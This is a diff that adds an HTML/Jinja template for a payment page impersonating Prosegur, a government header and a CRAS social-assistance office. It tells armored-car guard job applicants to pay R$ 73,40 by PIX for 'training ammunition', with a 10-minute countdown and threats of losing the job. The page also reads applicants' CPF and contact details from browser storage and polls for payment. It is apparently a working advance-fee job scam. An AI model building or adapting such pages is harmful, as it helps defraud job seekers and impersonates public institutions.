@@ -1,0 +1,399 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prosegur - Confirmação de Agendamento</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        /* Rawline Font Family */
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+          font-weight: 400;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+          font-weight: 500;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+          font-weight: 600;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+          font-weight: 700;
+          font-style: normal;
+        }
+
+        body {
+            font-family: 'Rawline', sans-serif;
+            font-size: 16px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        /* Consistent Font Weight for Bold Elements */
+        strong, .font-bold {
+          font-weight: 500 !important;
+        }
+
+        /* Standard Text Sizes and Colors */
+        .text-base {
+          font-size: 16px;
+          color: #555;
+          line-height: 1.5;
+        }
+    </style>
+    
+    <!-- Mobile Protection - Execute immediately -->
+    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
+</head>
+<body>
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- CRAS Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <section class="py-10 md:py-14">
+        <div class="container mx-auto px-4 md:px-8 text-center">
+            <h2 class="text-lg md:text-xl font-bold mb-1 leading-tight">Confirmação de Agendamento do Curso</h2>
+            <div class="w-24 h-2 bg-[#044785] mx-auto mb-3 rounded-full"></div>
+            <!-- Countdown Timer -->
+            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 max-w-md mx-auto">
+                <div class="text-center">
+                    <h3 class="text-lg font-bold text-red-800 mb-2">⏰ TEMPO LIMITE PARA PAGAMENTO</h3>
+                    <p class="text-red-700 text-sm mb-3">Você tem <strong>10 minutos</strong> para efetuar o pagamento ou perderá sua vaga!</p>
+                    <div id="countdown-timer" class="text-2xl font-bold text-red-600 bg-white p-3 rounded-lg">
+                        10:00
+                    </div>
+                </div>
+            </div>
+            
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
+                Para confirmar o agendamento do curso prático para assumir a vaga de Vigilante de Carro Forte, é obrigatório o pagamento da munição que será utilizada no treinamento. O valor é de <span class="font-bold text-red-600">R$ 73,40</span>.
+            </p>
+
+            <div class="flex flex-col items-center mb-6">
+                {% if payment_data %}
+                <!-- Payment Status Box -->
+                <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-6 w-full max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center space-x-2 mb-4">
+                        <div class="w-6 h-6 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text-blue-600 font-medium text-sm">Aguardando pagamento para finalizar</span>
+                    </div>
+                    <div class="border-t border-gray-300 pt-4 text-left">
+                        <p class="text-sm text-gray-700 mb-3" id="training-info">
+                            Após o pagamento, você deve comparecer ao local de treinamento conforme agendado.
+                        </p>
+                        <h4 class="font-semibold text-gray-800 mb-2 text-sm">Documentos obrigatórios para levar no dia:</h4>
+                        <ul class="list-disc list-inside space-y-1 text-sm text-gray-700">
+                            <li>Documento de identificação com foto (RG ou CNH)</li>
+                            <li>Comprovante de residência</li>
+                            <li>Carteira de trabalho</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <img src="{{ payment_data.pixQrCode }}" alt="QR Code para pagamento do curso prático de Vigilante de Carro Forte" class="w-48 h-48 mb-4">
+                <p class="text-sm text-gray-600 mb-4">Escaneie o QR Code acima para realizar o pagamento.</p>
+                {% else %}
+                <!-- Error Status Box -->
+                <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-6 w-full max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center space-x-2 mb-4">
+                        <div class="w-6 h-6 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text-red-500 font-medium text-sm">Erro ao gerar pagamento</span>
+                    </div>
+                    <div class="border-t border-gray-300 pt-4 text-left">
+                        <p class="text-sm text-gray-700 mb-3" id="training-info-error">
+                            Após o pagamento, você deve comparecer ao local de treinamento conforme agendado.
+                        </p>
+                        <h4 class="font-semibold text-gray-800 mb-2 text-sm">Documentos obrigatórios para levar no dia:</h4>
+                        <ul class="list-disc list-inside space-y-1 text-sm text-gray-700">
+                            <li>Documento de identificação com foto (RG ou CNH)</li>
+                            <li>Comprovante de residência</li>
+                            <li>Carteira de trabalho</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
+                    <p>Não foi possível gerar o pagamento PIX. Tente novamente.</p>
+                    <a href="/agendamento" class="text-red-800 underline">Voltar ao agendamento</a>
+                </div>
+                {% endif %}
+            </div>
+
+
+
+            {% if payment_data %}
+            <div class="max-w-lg mx-auto">
+                <label for="pix-code" class="block text-sm font-medium text-gray-700 mb-2">Código Pix (Copia e Cola):</label>
+                <div class="relative mb-4">
+                    <input type="text" id="pix-code" value="{{ payment_data.pixCode }}" readonly class="w-full px-4 py-2 border border-gray-300 rounded-lg text-sm text-gray-700">
+                </div>
+                <button onclick="copyPixCode()" class="bg-[#044785] text-white font-medium px-4 py-2 rounded text-sm w-full">Copiar Código Pix</button>
+            </div>
+            {% endif %}
+
+            <p class="max-w-3xl mx-auto mt-6 mb-6 md:mb-10 leading-relaxed text-sm font-bold text-red-600">
+                Atenção: Caso o pagamento não seja realizado, você poderá perder a vaga para outro candidato que efetuar o pagamento antes de você. Garanta sua vaga agora mesmo!
+            </p>
+
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
+                Após o pagamento, o curso de Vigilante da Prosegur será confirmado e você poderá assumir a vaga. Certifique-se de clicar no botão abaixo após realizar o pagamento.
+            </p>
+
+            <a href="#" class="bg-[#044785] text-white font-medium px-6 md:px-8 py-3 rounded-full inline-block">Confirmar Pagamento</a>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-[#044785] text-white py-8 md:py-12">
+        <div class="container mx-auto px-4 md:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">O que é o CRAS</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Proteção Social Básica</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Atendimento às Famílias</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Grupos de Convivência</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Benefícios Sociais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Assistência Social</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Cadastro Único</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Bolsa Família</a></li>
+                        <li><a href="#" class="hover:text-gray-200">BPC</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Auxílio Brasil</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Programas Sociais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Vagas</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Portal do Servidor</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <hr class="border-blue-400 mb-6">
+            
+            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
+                <div class="mb-4 md:mb-0">
+                    <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
+                </div>
+                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
+                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
+                </div>
+                <div class="flex space-x-4 mt-4 md:mt-0">
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // 10-minute countdown timer
+        let timeLeft = 10 * 60; // 10 minutes in seconds
+        const timerElement = document.getElementById('countdown-timer');
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            
+            timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            // Change color when time is running out
+            if (timeLeft <= 120) { // Last 2 minutes
+                timerElement.classList.add('text-red-800', 'animate-pulse');
+            } else if (timeLeft <= 300) { // Last 5 minutes
+                timerElement.classList.add('text-red-700');
+            }
+            
+            if (timeLeft <= 0) {
+                // Time's up - redirect to timeout page
+                timerElement.textContent = "TEMPO ESGOTADO!";
+                timerElement.classList.add('text-red-900', 'bg-red-100');
+                setTimeout(() => {
+                    alert("Tempo esgotado! Você perdeu sua vaga. Será redirecionado para nova tentativa.");
+                    window.location.href = "/agendamento";
+                }, 2000);
+                return;
+            }
+            
+            timeLeft--;
+        }
+        
+        // Hide loading overlay after 3 seconds
+        setTimeout(function() {
+            document.getElementById('payment-loading').style.display = 'none';
+        }, 3000);
+        
+        // Retrieve user data from localStorage if available
+        const userData = {
+            name: localStorage.getItem('candidateName') || 'Candidato',
+            cpf: localStorage.getItem('candidateCPF') || '',
+            email: localStorage.getItem('candidateEmail') || '',
+            phone: localStorage.getItem('candidatePhone') || '',
+            city: localStorage.getItem('candidateCity') || ''
+        };
+        console.log('User data from localStorage:', userData);
+        
+        // Update timer every second
+        updateTimer();
+        setInterval(updateTimer, 1000);
+        
+        function copyPixCode() {
+            const pixCode = document.getElementById('pix-code');
+            pixCode.select();
+            pixCode.setSelectionRange(0, 99999); // For mobile devices
+            navigator.clipboard.writeText(pixCode.value);
+            
+            // Change button text temporarily
+            const button = event.target;
+            const originalText = button.textContent;
+            button.textContent = 'Copiado!';
+            button.style.backgroundColor = '#10B981';
+            button.style.color = 'white';
+            
+            setTimeout(() => {
+                button.textContent = originalText;
+                button.style.backgroundColor = '#044785';
+                button.style.color = 'black';
+            }, 2000);
+        }
+
+        // Automatic payment status checking for R$ 73.40 payments
+        let statusCheckInterval;
+        
+        function startPaymentStatusCheck() {
+            // Get transaction ID from template variable first, then fallback to other sources
+            let transactionId = '{{ transaction_id }}' || null;
+            
+            // If not available from template, try other sources
+            if (!transactionId || transactionId === 'None') {
+                const urlParams = new URLSearchParams(window.location.search);
+                transactionId = urlParams.get('transaction_id') || 
+                              sessionStorage.getItem('transactionId') || 
+                              localStorage.getItem('transactionId') ||
+                              localStorage.getItem('paymentId');
+                
+                // Also check if there's a payment data object in localStorage
+                if (!transactionId) {
+                    try {
+                        const paymentData = JSON.parse(localStorage.getItem('payment_data') || '{}');
+                        transactionId = paymentData.id || paymentData.transactionId;
+                    } catch (e) {
+                        console.log('Error parsing payment data from localStorage');
+                    }
+                }
+            }
+            
+            if (!transactionId || transactionId === 'None') {
+                console.log('No transaction ID found for status checking');
+                return;
+            }
+            
+            console.log('Starting automatic payment status check for transaction:', transactionId);
+            
+            // Check payment status every 1 second for immediate redirection
+            statusCheckInterval = setInterval(() => {
+                checkPaymentStatus(transactionId);
+            }, 1000);
+            
+            // Initial check
+            checkPaymentStatus(transactionId);
+        }
+        
+        function checkPaymentStatus(transactionId) {
+            fetch(`/check_payment_status/${transactionId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Payment status check result:', data);
+                    
+                    if (data.success && data.redirect) {
+                        // Stop checking
+                        clearInterval(statusCheckInterval);
+                        
+                        // Show confirmation message
+                        alert('Pagamento confirmado! Redirecionando para ativação da CNV...');
+                        
+                        // Use redirect_url if provided, otherwise default to /aviso
+                        const redirectUrl = data.redirect_url || '/aviso';
+                        console.log('Payment confirmed - redirecting to:', redirectUrl);
+                        
+                        // Redirect immediately
+                        window.location.href = redirectUrl;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking payment status:', error);
+                });
+        }
+        
+        // Start automatic payment checking when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Start checking immediately for fastest redirection
+            setTimeout(() => {
+                startPaymentStatusCheck();
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
